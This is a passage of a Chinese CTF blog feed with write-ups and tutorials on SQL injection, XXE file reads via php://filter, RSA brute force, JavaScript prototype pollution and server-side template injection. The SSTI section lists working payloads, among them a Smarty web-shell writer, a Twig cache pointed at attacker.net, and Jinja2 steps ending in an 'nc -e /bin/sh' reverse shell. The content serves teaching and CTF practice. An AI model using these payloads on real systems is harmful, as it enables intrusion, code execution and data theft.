&apos;14.3&apos;</code></pre><p>我们通过<code>sql_mode=PIPES_AS_CONCAT</code>来将flag带出来</p><p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p><p>语句为:</p><pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>payload:<code>*,1</code>构造<code>select *,1 || flag from Flag;</code> 即可查出全部内容。</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TokyoWestern 2019</title>
      <link href="/2019/09/05/TokyoWesterns-2019/"/>
      <url>/2019/09/05/TokyoWesterns-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="TokyoWestern-2019"><a href="#TokyoWestern-2019" class="headerlink" title="TokyoWestern 2019"></a>TokyoWestern 2019</h1><p>9/5/2019 5:20:26 PM 🎨</p><h2 id="ji2xji2"><a href="#ji2xji2" class="headerlink" title="ji2xji2"></a>ji2xji2</h2><p>拿到题目第一反应就是XXE，直接拿着之前博客的payload一顿试，结果得到了<code>failed to decode xml</code>，然后就在想是不是思路错了，没想到是读的文件不存在，其实拿最简单的</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>就能看出来可以解析，因为觉得不可能这么简单就没有试…</p><p>读源码</p><pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>这里我们要注意得到的加密后的数据在哪里结束</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg" alt="读源码"></p><p>得到源码，从第一句得到<strong>flag</strong>的位置</p><pre><code>&lt;?php**include &apos;flag.php&apos;;**$method = $_SERVER[&apos;REQUEST_METHOD&apos;];function die404($msg) {  http_response_code(404);  die($msg);}function check_type($obj) {  if (is_array($obj)) {    $key_is_str = function($obj) {      foreach($obj as $key=&gt;$val) {        if (is_int($key))          return false;      }      return true;    };    if ($key_is_str($obj)) {      return &apos;object&apos;;    }    else {      return &apos;array&apos;;    }  }  else {    return gettype($obj);  }}function json2xml($obj) {  $res = &apos;&apos;;  if (is_array($obj)) {    foreach($obj as $key =&gt; $val) {      switch(check_type($val)) {        case &apos;array&apos;:          foreach($val as $v) {            $res .= &quot;&lt;$key&gt;&quot;;            $res .= json2xml($v);            $res .= &quot;&lt;/$key&gt;&quot;;          }          break;        default: // object or primitive          $res .= &quot;&lt;$key&gt;&quot;;          $res .= json2xml($val);          $res .= &quot;&lt;/$key&gt;&quot;;          break;      }    }  }  else {    $res = (string)$obj;  }  return $res;}if ($method === &apos;POST&apos;) {  $jsonstr = $_POST[&apos;json&apos;];  $xmlstr = $_POST[&apos;xml&apos;];  if (!(empty($xmlstr) ^ empty($jsonstr))) {    die404(&apos;404&apos;);  }  if (!empty($jsonstr)) {    $obj = json_decode($jsonstr, true);    if (empty($obj)) {      die(&apos;failed to decode json&apos;);    }    $doc = new DOMDocument(&apos;1.0&apos;);    $doc-&gt;formatOutput = true;    $_obj = array();    $_obj[&apos;root&apos;] = $obj;    $doc-&gt;loadXML(json2xml($_obj));    echo $doc-&gt;saveXML();  }  if (!empty($xmlstr)) {    libxml_disable_entity_loader(false);    $obj = simplexml_load_string($xmlstr, &apos;SimpleXMLElement&apos;, LIBXML_NOENT);    if (empty($obj)) {      die(&apos;failed to decode xml&apos;);    }    echo json_encode($obj, JSON_PRETTY_PRINT);  }}else {?&gt;&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;JSON &lt;-&gt; XML Converter&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;textarea id=&quot;json&quot; name=&quot;json&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;    &lt;/textarea&gt;    &lt;input type=&quot;button&quot; id=&quot;x2j&quot; value=&quot;&lt;-&quot;/&gt;    &lt;input type=&quot;button&quot; id=&quot;j2x&quot; value=&quot;-&gt;&quot;/&gt;    &lt;textarea id=&quot;xml&quot; name=&quot;xml&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;    &lt;/textarea&gt;    &lt;script      src=&quot;https://code.jquery.com/jquery-3.2.1.min.js&quot;      integrity=&quot;sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=&quot;      crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;    &lt;script&gt;      $.get(&apos;/sample.json&apos;, function(data) {        $(&apos;#json&apos;).val(data);      }, &apos;text&apos;);      $(&apos;#j2x&apos;).on(&apos;click&apos;, function() {        $.post(&apos;/&apos;, {          json: $(&apos;#json&apos;).val()        }, function(data) {          $(&apos;#xml&apos;).val(data);        });      });      $(&apos;#x2j&apos;).on(&apos;click&apos;, function() {        $.post(&apos;/&apos;, {          xml: $(&apos;#xml&apos;).val()        }, function(data) {          $(&apos;#json&apos;).val(data);        });      });    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>读flag</p><pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>解密即可<br>    {<br>        “message”: “PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK”<br>    }</p><pre><code>$flag = &apos;TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}&apos;;</code></pre><h2 id="real-baby-rsa"><a href="#real-baby-rsa" class="headerlink" title="real-baby-rsa"></a>real-baby-rsa</h2><p>告诉了我们N,e以及所有加密后的密文，直接爆破。(做的时候又是那样想的：怎么可能这么简单！(这么简单开始的时候还不知道替换掉换行符，搞了半天没做成😔(；′⌒`)))</p><pre><code>#flag = &apos;TWCTF{CENSORED}&apos;#print(flag)# Public ParametersN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091e = 65537# Encrypt the flag!#for i in flag1:for char in flag:    print(pow(ord(char), e, N))</code></pre><p>解密脚本：</p><pre><code>import string#flag = &apos;TWCTF{CENSORED}&apos;flag = string.letters+string.digits+&quot;!@#$%^&amp;*()/{}_&quot;#print(flag)# Public ParametersN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091e = 65537content = open(&quot;output&quot;).readlines()for line in content:    line = line.replace(&apos;\n&apos;, &apos;&apos;)    for char in flag:        #print char        #print(pow(ord(char), e, N))        m = pow(ord(char), e, N)        #print(m)        #print(line)        if str(m) == str(line):            #print(m)            print(char),            break</code></pre><p>再贴一个国外师傅写的，看起来就是比上面的优雅一点😀，别问为什么贴两个？问就是喜欢收集！</p><pre><code>N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091e = 65537#create ist ascii charlist_ascii = []for i in range(33,126):    list_ascii.append(chr(i))#read each part of cipher text in to listlineList = list()lineList = [line.rstrip(&apos;\n&apos;) for line in open(&quot;output&quot;)]#starting burte forcemesg = &quot;&quot;for cir in range(0,len(lineList)):    for m in list_ascii:        test_str = pow(ord(m),e,N)        test_str = str(test_str)        if(lineList[cir] in test_str):            mesg += m            breakprint(mesg)</code></pre><h2 id="php-note"><a href="#php-note" class="headerlink" title="php-note"></a>php-note</h2><pre><code>first name :1lastname: {{2*2}}</code></pre><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6ett6fj30pe0d1wep.jpg" alt="登陆成功"></p><p>查看源码得到hint:<code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code></p><p>读源码</p><pre><code> &lt;?phpinclude &apos;config.php&apos;;class Note {    public function __construct($admin) {        $this-&gt;notes = array();        $this-&gt;isadmin = $admin;    }    public function addnote($title, $body) {        array_push($this-&gt;notes, [$title, $body]);    }    public function getnotes() {        return $this-&gt;notes;    }    public function getflag() {        if ($this-&gt;isadmin === true) {            echo FLAG;        }    }}function verify($data, $hmac) {    $secret = $_SESSION[&apos;secret&apos;];    if (empty($secret)) return false;    return hash_equals(hash_hmac(&apos;sha256&apos;, $data, $secret), $hmac);}function hmac($data) {    $secret = $_SESSION[&apos;secret&apos;];    if (empty($data) || empty($secret)) return false;    return hash_hmac(&apos;sha256&apos;, $data, $secret);}function gen_secret($seed) {    return md5(SALT . $seed . PEPPER);}function is_login() {    return !empty($_SESSION[&apos;secret&apos;]);}function redirect($action) {    header(&quot;Location: /?action=$action&quot;);    exit();}$method = $_SERVER[&apos;REQUEST_METHOD&apos;];$action = $_GET[&apos;action&apos;];if (!in_array($action, [&apos;index&apos;, &apos;login&apos;, &apos;logout&apos;, &apos;post&apos;, &apos;source&apos;, &apos;getflag&apos;])) {    redirect(&apos;index&apos;);}if ($action === &apos;source&apos;) {    highlight_file(__FILE__);    exit();}session_start();if (is_login()) {    $realname = $_SESSION[&apos;realname&apos;];    $nickname = $_SESSION[&apos;nickname&apos;];    $note = verify($_COOKIE[&apos;note&apos;], $_COOKIE[&apos;hmac&apos;])            ? unserialize(base64_decode($_COOKIE[&apos;note&apos;]))            : new Note(false);}if ($action === &apos;login&apos;) {    if ($method === &apos;POST&apos;) {        $nickname = (string)$_POST[&apos;nickname&apos;];        $realname = (string)$_POST[&apos;realname&apos;];        if (empty($realname) || strlen($realname) &lt; 8) {            die(&apos;invalid name&apos;);        }        $_SESSION[&apos;realname&apos;] = $realname;        if (!empty($nickname)) {            $_SESSION[&apos;nickname&apos;] = $nickname;        }        $_SESSION[&apos;secret&apos;] = gen_secret($nickname);    }    redirect(&apos;index&apos;);}if ($action === &apos;logout&apos;) {    session_destroy();    redirect(&apos;index&apos;);}if ($action === &apos;post&apos;) {    if ($method === &apos;POST&apos;) {        $title = (string)$_POST[&apos;title&apos;];        $body = (string)$_POST[&apos;body&apos;];        $note-&gt;addnote($title, $body);        $data = base64_encode(serialize($note));        setcookie(&apos;note&apos;, (string)$data);        setcookie(&apos;hmac&apos;, (string)hmac($data));    }    redirect(&apos;index&apos;);}if ($action === &apos;getflag&apos;) {    $note-&gt;getflag();}?&gt;&lt;!doctype html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PHP note&lt;/title&gt;    &lt;/head&gt;    &lt;style&gt;        textarea {            resize: none;            width: 300px;            height: 200px;        }    &lt;/style&gt;    &lt;body&gt;        &lt;?php        if (!is_login()) {            $realname = htmlspecialchars($realname);            $nickname = htmlspecialchars($nickname);        ?&gt;        &lt;form action=&quot;/?action=login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;            &lt;input type=&quot;text&quot; id=&quot;firstname&quot; placeholder=&quot;First Name&quot;&gt;            &lt;input type=&quot;text&quot; id=&quot;lastname&quot; placeholder=&quot;Last Name&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; placeholder=&quot;nickname&quot;&gt;            &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; id=&quot;realname&quot;&gt;            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;        &lt;/form&gt;        &lt;?php        } else {        ?&gt;        &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? &quot; ($nickname)&quot; : &quot;&quot; ?&gt;&lt;/h1&gt;        &lt;a href=&quot;/?action=logout&quot;&gt;logout&lt;/a&gt;        &lt;!-- &lt;a href=&quot;/?action=source&quot;&gt;source&lt;/a&gt; --&gt;        &lt;br/&gt;        &lt;br/&gt;        &lt;?php            foreach($note-&gt;getnotes() as $k =&gt; $v) {                list($title, $body) = $v;                $title = htmlspecialchars($title);                $body = htmlspecialchars($body);        ?&gt;        &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt;        &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt;        &lt;?php            }        ?&gt;        &lt;form action=&quot;/?action=post&quot; method=&quot;post&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;title&quot;&gt;            &lt;br&gt;            &lt;textarea name=&quot;body&quot; placeholder=&quot;body&quot;&gt;&lt;/textarea&gt;            &lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;        &lt;/form&gt;        &lt;?php        }        ?&gt;        &lt;?php        ?&gt;        &lt;script&gt;            document.querySelector(&quot;form#login&quot;).addEventListener(&apos;submit&apos;, (e) =&gt; {                const nickname = document.querySelector(&quot;input#nickname&quot;)                const firstname = document.querySelector(&quot;input#firstname&quot;)                const lastname = document.querySelector(&quot;input#lastname&quot;)                document.querySelector(&quot;input#realname&quot;).value = `${firstname.value} ${lastname.value}`                if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) {                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()                }            })        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt; </code></pre><p>没做完，先留坑</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Prototype 污染攻击</title>
      <link href="/2019/08/31/JavaScript%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/"/>
      <url>/2019/08/31/JavaScript%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>JS真有趣！</p><a id="more"></a><h1 id="JavaScript-Prototype-污染攻击"><a href="#JavaScript-Prototype-污染攻击" class="headerlink" title="JavaScript Prototype 污染攻击"></a>JavaScript Prototype 污染攻击</h1><h2 id="JS基本语法"><a href="#JS基本语法" class="headerlink" title="JS基本语法"></a>JS基本语法</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul><li><p>window.alert();弹出警告框</p></li><li><p>console.log();将内容写到控制台</p><p>  a = 5;<br>  b = 6;<br>  c = a + b;<br>  console.log(c);<br>  11 debugger eval code:1:9<br>  undefined</p></li></ul><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>JS使用对象(Object)定义一个对象</p><pre><code>var person = {firstname:&quot;John&quot;,lastname:&quot;Doe&quot;};personObject { firstname: &quot;John&quot;, lastname: &quot;Doe&quot; }</code></pre><p>JS语句可以写在函数内，函数可以重复引用：<strong>引用一个函数</strong> = 调用函数(执行函数内的语句)</p><pre><code>function myFuncion(a,b) {  return a * b;}myFuncion(2,3)6</code></pre><p>JS大小写敏感</p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>我们可以通过定义变量来创建对象</p><pre><code>var car = {type:&quot;tzla&quot;,modle:500,color:&quot;white&quot;};</code></pre><p>这里，3个值<code>{&quot;tzle&quot;,500,&quot;white&quot;}</code>赋予变量car、3个变量<code>{type,modle,color}</code>赋予变量car.</p><p>通常认为JS对象是键值对的容器。</p><p>我们有两种方式访问对象属性</p><pre><code>car.modle;car[&quot;modle&quot;];</code></pre><p>对象的方法定义了一个函数，并作为对象的属性存储</p><pre><code>var person = {    firstName: &quot;John&quot;,    lastName : &quot;Doe&quot;,    id : 5566,    fullName : function()     {       return this.firstName + &quot; &quot; + this.lastName;    }};</code></pre><p>对象方法通过添加()调用(作为一个函数)。</p><pre><code>name = person.fullName();</code></pre><p>如果访问person对象的fullName属性，<code>name = person.fullName;</code> 他将作为一个字符串返回。</p><h2 id="prototype-和-proto-分别是什么"><a href="#prototype-和-proto-分别是什么" class="headerlink" title="prototype 和 __proto__ 分别是什么"></a><code>prototype</code> 和 <code>__proto__</code> 分别是什么</h2><p>我们以构造函数的方式来定义一个类</p><pre><code>function Foo() {    this.bar = 1}new Foo()</code></pre><p>Foo函数的内容就是Foo类的构造函数,而this.bar就是Foo类的一个属性。</p><p>我们也可以将方法定义在构造函数内部：</p><pre><code>function Foo() {    this.bar = 1    this.show = function() {    console.log(this.bar)    }}(new Foo()).show()</code></pre><p>但是这样的问题是每当我们新建一个Foo对象时，this.show = function…就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在”类”中。</p><p>我们使用原型(prototype)来实现在创建类的时候只创建一次show方法：</p><pre><code>function Foo() {    this.bar = 1}Foo.prototype.show = function show() {  console.log(this.bar)}let foo = new Foo()foo.show()</code></pre><p>foo可以调用<code>show</code>方法来输出结果<code>1</code>。</p><p>我们可以认为<code>prototype</code>是类<code>Foo</code>的一个属性，而所有Foo类实例化出来的对象都将拥有这个属性中的所有内容，包括变量和方法，就像foo具有<code>foo.show()</code>方法。</p><p>我们可以通过prototype来访问Foo类的原型，但是Foo类实例化出来的对象是不能访问原型的，这里我们用到<code>__proto__</code>。</p><p>一个Foo类实例化出来的对象是可以通过foo.<strong>proto</strong>属性来访问Foo类的原型：</p><pre><code>foo.__proto__Object { show: show(), … }Foo.prototypeObject { show: show(), … }Foo.prototype === foo.__proto__ true</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476" alt="二者的关系"></p><p>于是我们知道：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性指向这个对象所在类的<code>prototype</code>属性</li></ol><h2 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h2><p>所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承</p><pre><code>function Father() {    this.first_name = &apos;Donald&apos;    this.last_name = &apos;Trump&apos;}function Son() {    this.first_name = &apos;Melania&apos;}Son.prototype = new Father()let son = new Son()console.log(`Name: ${son.first_name} ${son.last_name}`)Name: Melania Trump</code></pre><p>在调用<code>son.last_name</code>的时候，JavaScript引擎做了这些事：</p><ol><li>在对象<code>son</code>中寻找<code>last_name</code></li><li>如果找不到，则在<code>son.__proto__</code>中寻找<code>last_name</code></li><li>如果仍然找不到，则在<code>son.__proto__.__proto__</code>中寻找<code>last_name</code></li><li>一次寻找，直到找到<code>Null</code>结束。<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code>，因此<code>Object</code>是所有原型链的最顶层。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258679/1560691466319-0c780440-b626-4d58-a3c0-315ccc5c3210.png#align=left&display=inline&height=444&name=image.png&originHeight=888&originWidth=1110&size=127913&status=done&width=555" alt></p><p>于是我们知道：</p><ol><li>每个构造函数(constructor)都含有一个原型对象<code>prototype</code></li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li><code>JavaScript</code>使用<code>prototype</code>链实现继承机制</li></ol><h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>由上文我们可以知道<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>.那么，如果我们修改了<code>foo.__proto__</code>中的值，就可以修改<code>Foo</code>类.</p><p>同时我们也知道我们有两种方式去访问对象的属性，当我们通过指定下标的方式去访问的时候，我们可以通过<code>b[&quot;__proto__&quot;]</code>的方式去访问其原型对象</p><pre><code>a = []b = []b[&quot;__proto__&quot;][&quot;admintoken&quot;]=&quot;123456&quot;;a.admintoken&quot;123456&quot;</code></pre><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI-服务器端模板注入</title>
      <link href="/2019/08/30/SSTI/"/>
      <url>/2019/08/30/SSTI/</url>
      
        <content type="html"><![CDATA[<p>终于到了学习SSTI的时间呢！</p><a id="more"></a><h1 id="SSTI-服务器端模板注入"><a href="#SSTI-服务器端模板注入" class="headerlink" title="SSTI-服务器端模板注入"></a>SSTI-服务器端模板注入</h1><p>8/30/2019 3:28:13 PM </p><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>使用PHP模板引擎Twig作例子演示注入原理</p><pre><code>&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值echo $output;</code></pre><blockquote><p>In this example the user controls the content of the template itself via the custom_email GET parameter, rather than a value passed into it. </p></blockquote><p><code></code>模板变量值作为参数来自于<code>GET</code>请求<code>$_GET[&quot;name&quot;]</code>。这段代码没什么问题。模板引擎默认会对渲染的变量值进行编码和转义，所以并不会造成<code>XSS</code>等。</p><p>但是如果我们修改代码</p><pre><code>&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分echo $output;</code></pre><p>我们将<code>GET</code>的参数直接作为模板的内容，不再对其进行编码和转义了则很容易出现攻击点。于是我们知道漏洞的原因是服务器端相信了用户的输入。</p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>如何判断是否存在<code>SSTI</code>？</p><p>我们还以上面的代码为例：</p><pre><code>&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分echo $output;</code></pre><p>在Twing模板引擎里<code></code>不仅可以输出传递的变量外，还能执行一些基本的表达式然后将其作为模板变量的值。我们输入<code>name=20</code>,服务端得到内容为 <code>Hello 20</code>，会输出 <code>Hello 20</code>.</p><p>我们现在修改数据为</p><pre><code>IsVlun{{2*8}}OK</code></pre><p>服务器端收到内容为</p><pre><code>Hello IsVuln{{2*8}}OK</code></pre><p>由于作为Twing模板的默认注释形式，所以并不会被前端输出，而<code>2*8</code>则会被计算，最终输出</p><pre><code>Hello IsVuln16OK</code></pre><p>得到扫描的大致流程为</p><p><img src="http://rickgray.me/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png" alt="扫描流程(Twig)"></p><p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p><h2 id="常用引擎"><a href="#常用引擎" class="headerlink" title="常用引擎"></a>常用引擎</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ol><li>Smarty：<code>{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)}</code>、<code>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())}</code></li><li>Twig：<code>{{_self.env.setCache("ftp://attacker.net:2121")}}``{{_self.env.loadTemplate("backdoor")}}</code>、<code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></li><li>Blade：</li></ol><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><ol><li>JSP</li><li>FreeMarker：<code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) }</code></li><li>Velocity</li><li>Spring boot</li></ol><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><ol><li>Jinja2：<code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}</code><br> <code>//写文件</code> {{ config.from_pyfile('/tmp/evil') }} //加载system {{ config['SHELL']('nc xxxx xx -e /bin/sh') }} //执行命令反弹SHELL</li><li>django：<code>http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}</code>、<code>http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></li><li>tornado：<code>http://117.78.26.79:31093/error?msg={{handler.settings}}</code></li></ol><h2 id="如何判断引擎种类"><a href="#如何判断引擎种类" class="headerlink" title="如何判断引擎种类"></a>如何判断引擎种类</h2><p>这里参考james大神的文章</p><blockquote><p>Green and red arrows represent ‘success’ and ‘failure’ responses respectively. In some cases, a single payload can have multiple distinct success responses - for example, the probe {{7*'7'}} would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use.</p></blockquote><p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="检测思路"></p><h2 id="OGeak-ctf-Render"><a href="#OGeak-ctf-Render" class="headerlink" title="OGeak-ctf Render"></a>OGeak-ctf Render</h2><p>题目链接：<a href="http://47.107.244.251:18080/" title="点这里" target="_blank" rel="noopener">http://47.107.244.251:18080/</a></p><p>查看后端代码</p><pre><code>var app = new Vue({    el: &apos;#app&apos;,    data: {        content: &apos;&apos;,        result: &apos;&apos;    },    methods: {        request: function(event) {            var vm = this            axios.post(&apos;/render&apos;, {                content: vm.content            })                .then(function (response) {                    console.log(response)                    vm.result = response.data.result                })                .catch(function (error) {                    console.log(error)                    vm.result = error                })        }    }})</code></pre><p>将我们的输入值返回给<code>result</code>进行输出.这里似乎没用到什么模板语法，但是它仍然会将<code>post</code>的<code>content</code>用模板的方式去渲染。</p><p>我们尝试常用的模板引擎语法测试</p><p>最终</p><pre><code>[[1+1]]</code></pre><p>被成功解析</p><p>我们随便访问一个页面发现是Spring boot,既然是Java写的那我们就java读文件，语法参考<a href="https://dotblogs.com.tw/cylcode/2018/09/21/170510" title="这里" target="_blank" rel="noopener">https://dotblogs.com.tw/cylcode/2018/09/21/170510</a></p><p>payload:</p><pre><code>[[${new java.io.BufferedReader(new java.io.FileReader(&quot;/flag&quot;)).readLine()}]]</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/</a><br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84</a><br><a href="https://portswigger.net/blog/server-side-template-injection#top" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection#top</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HostSplit-Exploitable</title>
      <link href="/2019/08/22/HostSplit/"/>
      <url>/2019/08/22/HostSplit/</url>
      
